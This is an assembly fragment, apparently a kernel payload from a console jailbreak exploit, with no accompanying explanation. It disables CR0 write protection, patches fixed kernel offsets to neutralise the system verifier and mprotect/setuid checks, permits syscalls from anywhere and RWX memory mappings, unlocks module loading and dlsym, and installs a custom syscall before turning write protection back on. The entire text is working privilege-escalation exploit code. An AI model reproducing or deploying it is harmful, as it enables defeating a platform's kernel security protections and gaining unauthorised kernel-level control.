//disable wp
mov rax, cr0
and rax, 0xFFFFFFFFFFFEFFFF
mov cr0, rax

//sysveri just die
mov byte ptr [rdi + 0x63a160], 0xC3
mov dword ptr [rdi + 0x63acc0], 0xC3C03148
mov dword ptr [rdi + 0x639f10], 0xC3C03148
mov dword ptr [rdi + 0x63a6e0], 0xC3C03148
mov byte ptr [rdi + 0x267b5c0], 0x00

//mprotect
mov rsi, 0x8B49909090909090
mov qword ptr [rdi + 0x264C08], rsi

//setuid
mov dword ptr [rdi + 0x87B70], 0xB8

//syscall everywhere
mov dword ptr [rdi + 0x490], 0x0
mov word ptr [rdi + 0x4B9], 0x9090
mov word ptr [rdi + 0x4BD], 0x9090
mov word ptr [rdi + 0x4C6], 0xE990

//rwx mmap
mov byte ptr [rdi + 0x1D2336], 0x37
mov byte ptr [rdi + 0x1D2339], 0x37

//patch load prx
mov word ptr [rdi + 0x94EC1], 0xE990

//dlsym
mov word ptr [rdi + 0x9547B], 0xE990
mov dword ptr [rdi + 0x2F2C20], 0xC3C03148

//syscall 11
mov qword ptr [rdi + 0x1125870], 0x2
lea rsi, [rdi + 0x6B192]
mov qword ptr [rdi + 0x1125878], rsi
mov dword ptr [rdi + 0x112589C], 0x1

//enable wp
or rax, 0x10000
mov cr0, rax
mov rax, 0x8080808080808080
ret
*/


//rdi
//rsi
//rdx
//rcx
//r8
//r9